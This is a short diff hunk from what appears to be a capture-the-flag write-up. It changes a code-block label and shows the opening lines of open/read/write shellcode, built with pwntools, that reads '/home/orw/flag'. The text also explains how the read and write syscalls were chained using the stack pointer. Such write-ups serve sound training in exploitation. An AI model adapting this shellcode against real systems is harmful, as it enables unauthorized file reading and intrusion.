@@ -46,7 +46,7 @@ python -c "from pwn import *; print(pwnlib.shellcraft.i386.linux.syscall('SYS_wr
 We had to tie together the `SYS_read` and `SYS_write` system calls by replacing the stubbed buffer value of `60`
 with the stack pointer. We also replaced the syscall macros with their respective integer numbers just in case.
 
-```asm
+```diff
     /* open(file='/home/orw/flag', oflag=0, mode=0) */
     /* push '/home/orw/flag\x00' */
     push 0x1010101
